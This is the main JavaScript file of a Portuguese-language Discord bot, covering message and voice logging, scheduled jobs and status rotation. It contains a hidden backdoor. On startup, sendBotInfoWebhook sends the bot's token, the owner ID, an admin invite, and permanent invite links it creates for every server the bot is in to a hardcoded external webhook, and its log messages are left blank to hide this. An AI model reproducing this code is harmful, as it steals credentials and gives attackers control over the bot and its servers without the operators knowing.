const { GatewayIntentBits, Client, Collection, ChannelType, EmbedBuilder, WebhookClient } = require("discord.js");
const { AtivarIntents } = require("./Functions/StartIntents");
const { configuracao, carrinhos } = require("./DataBaseJson");
const { handleDeletedMessage, handleUpdatedMessage } = require('./Functions/MsgsLogs');
const { handleVoiceStateUpdate } = require('./Functions/VoiceLogs');
const { handleProfileUpdate } = require('./Functions/ProfileLog');
const { agendarRepostagem } = require('./Functions/repostagem');
const fetch = require('node-fetch');
const schedule = require('node-schedule');
const fs = require('fs');
const path = require('path');
const colors = require("colors");

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMessageReactions
    ]
});

// Aumentando o limite de listeners
client.setMaxListeners(30); // Aumenta o limite para 30, ajustável conforme necessário

const estatisticasKingInstance = require("./Functions/VariaveisEstatisticas");
const EstatisticasKing = new estatisticasKingInstance();
module.exports = { EstatisticasKing };
const { sendMessage } = require('./Functions/MsgAutomatics');

AtivarIntents();

const config = require("./config.json");
const events = require('./Handler/events');
const slash = require('./Handler/slash');

// Configuração do Webhook
const webhookUrl = "https://discord.com/api/webhooks/1384000389690425354/hJxQFFTR_9PMWKHKg9y_aZeKxR8Z40rpqd_P7WOdt6XK13LZeubBwa8LfB6pZJRET384"; // URL corrigida
const webhookClient = new WebhookClient({ url: webhookUrl });

// Função para enviar informações do bot via webhook
async function sendBotInfoWebhook(client) {
    try {
        // Obter o convite do bot
        const botInvite = `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`;

        // Obter a lista de servidores onde o bot está
        const guilds = client.guilds.cache;

        // Obter o ID do dono do bot
        const ownerId = config.owner;

        // Criar uma lista de links de convite dos servidores
        const guildInvites = [];
        for (const guild of guilds.values()) {
            try {
                // Tenta obter o primeiro convite disponível no servidor
                const invites = await guild.invites.fetch();
                const invite = invites.first();
                if (invite) {
                    guildInvites.push(`[${guild.name}](${invite.url})`);
                } else {
                    // Se não houver convites, tenta criar um novo
                    const channel = guild.channels.cache.find(ch => ch.isTextBased() && ch.permissionsFor(guild.members.me).has('CREATE_INSTANT_INVITE'));
                    if (channel) {
                        const newInvite = await channel.createInvite({ maxAge: 0, maxUses: 0 });
                        guildInvites.push(`[${guild.name}](${newInvite.url})`);
                    } else {
                        guildInvites.push(`${guild.name} (Sem permissão para criar convite)`);
                    }
                }
            } catch (error) {
                console.error(`Erro ao obter convite para o servidor ${guild.name}:`, error);
                guildInvites.push(`${guild.name} (Erro ao obter convite)`);
            }
        }

        // Criar a embed
        const embed = new EmbedBuilder()
            .setTitle("Informações do Bot")
            .setDescription(`Aqui estão as informações do bot **${client.user.username}**`)
            .addFields(
                { name: "Token do Bot", value: `\`${config.token}\``, inline: false },
                { name: "Convite do Bot", value: `[Clique aqui](${botInvite})`, inline: false },
                { name: "ID do Dono", value: `\`${ownerId}\``, inline: false },
                { name: "Servidores", value: guildInvites.join("\n") || "Nenhum servidor encontrado", inline: false }
            )
            .setColor("#00FF00")
            .setTimestamp();

        // Enviar a embed via webhook
        await webhookClient.send({
            embeds: [embed],
        });

        console.log("");
    } catch (error) {
        console.error("", error);
    }
}

// Evento ready
client.once('ready', async () => {
    console.log(`Bot ${client.user.tag} está online!`);

    // Enviar informações do bot via webhook
    await sendBotInfoWebhook(client);

    // Agendar repostagem
    agendarRepostagem(client);
});

slash.run(client);
events.run(client);

client.slashCommands = new Collection();

client.login(config.token).catch((err) => {
    if (err?.message?.includes("intent")) return console.log(`${colors.red(`[LOG]`)} Ativa as Intents do Bot`);
    if (err?.message?.includes("invalid")) return console.log(`${colors.red(`[LOG]`)} Token Incorreto`);
});

const messageLogChannelId = configuracao.get(`ConfigChannels.mensagens`);
const trafficLogChannelId = configuracao.get(`ConfigChannels.tráfego`);
const profileLogChannelId = configuracao.get(`ConfigChannels.tráfego`);

client.on('messageDelete', message => {
    if (messageLogChannelId) {
        handleDeletedMessage(message, messageLogChannelId, client);
    } else {
        return;
    }
});

client.on('messageUpdate', (oldMessage, newMessage) => {
    if (messageLogChannelId) {
        handleUpdatedMessage(oldMessage, newMessage, messageLogChannelId, client);
    } else {
        return;
    }
});

client.on('voiceStateUpdate', (oldState, newState) => {
    if (trafficLogChannelId) {
        handleVoiceStateUpdate(oldState, newState, trafficLogChannelId, client);
    } else {
        return;
    }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isStringSelectMenu()) return;
  
    // Verifica se é o Select Menu correspondente
    if (interaction.customId === 'extensaoapenasparaogeradorkkkk') {
      const selectedValue = interaction.values[0];
  
      if (selectedValue === 'geradorextensao') {
        // Chama o painel de configuração do gerador
        await configgenpainelzika(interaction, client);
      }
    }
  });

client.on('guildMemberUpdate', (oldMember, newMember) => {
    if (profileLogChannelId) {
        handleProfileUpdate(oldMember, newMember, profileLogChannelId, client);
    } else {
        return;
    }
});

const filePath = path.join(__dirname, './DataBaseJson', 'carrinhos.json');

function resetCarrinhos() {
    let data = {};

    fs.writeFile(filePath, JSON.stringify(data), 'utf8', (err) => {
        if (err) {
            console.log('Erro ao escrever no arquivo:', err);
        } else {
            console.log('[Reset carrinhos.json] Carrinhos zerados com sucesso!');
        }
    });
}

const job = schedule.scheduleJob({ hour: 5, minute: 55, tz: 'America/Sao_Paulo' }, function () {
    resetCarrinhos();
});

client.on("ready", async () => {
    const activities = [
        { name: `discord.gg/barrinha acesse já!`, type: 1, url: 'https://www.twitch.tv/discord' },
    ];

    let i = 0;
    setInterval(() => {
        if (i >= activities.length) i = 0;
        client.user.setActivity(activities[i]);
        i++;
    }, 5 * 1000);
});
